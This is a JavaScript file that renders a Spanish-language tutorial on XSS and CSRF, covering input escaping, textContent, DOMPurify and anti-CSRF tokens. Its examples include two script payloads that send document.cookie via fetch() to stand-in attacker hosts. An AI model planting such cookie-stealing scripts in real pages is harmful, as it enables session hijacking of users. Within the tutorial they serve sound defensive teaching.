const content = document.getElementById('content');

content.innerHTML = `
    <section>
        <h2>Seguridad en JavaScript (XSS, CSRF)</h2>
        <p>Cuando construyes aplicaciones web, es crucial proteger a tus usuarios de ataques maliciosos. Aquí veremos dos de los ataques más comunes relacionados con el frontend.</p>
        <p><strong>Nota:</strong> La seguridad es un tema muy amplio y profundo. Esto es solo una introducción a los conceptos básicos.</p>

        <h3>Cross-Site Scripting (XSS)</h3>
        <p>El XSS ocurre cuando un atacante logra inyectar y ejecutar un script malicioso en una página web que están viendo otros usuarios. El objetivo suele ser robar información sensible, como las cookies de sesión.</p>
        <p><strong>El ataque:</strong> Imagina un blog donde los usuarios pueden dejar comentarios. Si no validas la entrada, un atacante podría escribir un comentario que no es texto, sino un script:</p>
        <pre><code>&lt;script&gt;
  // Este script roba la cookie del usuario y la envía al servidor del atacante
  fetch('https://servidor-del-atacante.com/robar?cookie=' + document.cookie);
&lt;/script&gt;
</code></pre>
        <p>Cuando otro usuario vea ese comentario, su navegador ejecutará el script sin saberlo.</p>
        <p><strong>La defensa (Sanitización de datos):</strong> ¡NUNCA confíes en los datos que vienen del usuario! Antes de mostrar cualquier dato introducido por un usuario en tu página, debes "sanitizarlo". Esto significa escapar los caracteres HTML para que el navegador los trate como texto y no como código. Por ejemplo, convertir <code>&lt;</code> en <code>&amp;lt;</code> y <code>&gt;</code> en <code>&amp;gt;</code>.</p>
        <p>La mayoría de los frameworks modernos (React, Vue, etc.) hacen esto automáticamente, pero si usas <code>innerHTML</code> directamente, eres vulnerable. Prefiere siempre usar <code>textContent</code>.</p>

        <h3>Cross-Site Request Forgery (CSRF)</h3>
        <p>El CSRF (o XSRF) engaña a un usuario autenticado para que realice una acción que no tenía la intención de hacer. El ataque se aprovecha de que el navegador envía automáticamente las cookies de sesión con cada petición a un dominio.</p>
        <p><strong>El ataque:</strong>
            <ol>
                <li>Un usuario inicia sesión en su banco: <code>mibanco.com</code>.</li>
                <li>El usuario, en otra pestaña, visita una página maliciosa: <code>pagina-de-gatitos-maliciosa.com</code>.</li>
                <li>Esta página tiene un formulario oculto que se envía automáticamente a <code>mibanco.com</code> para transferir dinero a la cuenta del atacante.</li>
                <li>Como el usuario está autenticado en <code>mibanco.com</code>, el navegador adjunta la cookie de sesión a la petición, y el banco la procesa como si fuera legítima.</li>
            </ol>
        </p>
        <p><strong>La defensa (Tokens Anti-CSRF):</strong> La solución más común es que el servidor genere un token único y secreto para cada sesión de usuario. Este token se debe incluir en todos los formularios y peticiones que cambian datos (POST, PUT, DELETE). Cuando el servidor recibe la petición, comprueba que el token enviado coincide con el que tiene guardado para esa sesión. Como el atacante no puede conocer este token, la petición falsificada falla.</p>

        <h3>Caso de Uso Práctico: Prevenir un Ataque XSS</h3>
        <p>Imagina que tienes una sección de comentarios en tu blog. Un usuario malintencionado, en lugar de escribir un comentario normal, escribe esto:</p>
        <pre><code>&lt;script&gt;
  // Este script roba las cookies del usuario que vea el comentario
  fetch('https://atacante.com/robar-cookies?data=' + document.cookie);
&lt;/script&gt;
</code></pre>
        <p>Si tomas ese texto y lo insertas directamente en el DOM de tu página con <code>innerHTML</code>, el navegador ejecutará el script y el atacante robará la información de sesión de tus usuarios.</p>
        <p><strong>La solución (Sanitización):</strong> Antes de mostrar cualquier contenido generado por el usuario, debes "sanitizarlo". Esto significa escapar los caracteres HTML peligrosos para que el navegador los trate como texto y no como código ejecutable.</p>
        <p><strong>Enfoque incorrecto (vulnerable):</strong></p>
        <pre><code>const comentarioDelUsuario = "&lt;script&gt;alert('XSS');&lt;/script&gt;";
document.getElementById('comentarios').innerHTML += comentarioDelUsuario; // ¡PELIGRO!
</code></pre>
        <p><strong>Enfoque correcto (seguro):</strong></p>
        <p>La forma más segura es evitar <code>innerHTML</code> y usar <code>textContent</code>, que automáticamente trata todo como texto.</p>
        <pre><code>const comentarioDelUsuario = "&lt;script&gt;alert('XSS');&lt;/script&gt;";
const nuevoComentario = document.createElement('div');
nuevoComentario.textContent = comentarioDelUsuario; // El script se muestra como texto, no se ejecuta
document.getElementById('comentarios').appendChild(nuevoComentario);
</code></pre>
        <p>Si necesitas permitir cierto HTML (como negritas o cursivas), debes usar una librería de sanitización robusta como <a href="https://github.com/cure53/DOMPurify" target="_blank">DOMPurify</a>, que se encarga de eliminar todo el código peligroso y dejar solo las etiquetas seguras que tú permitas.</p>
    </section>
`;
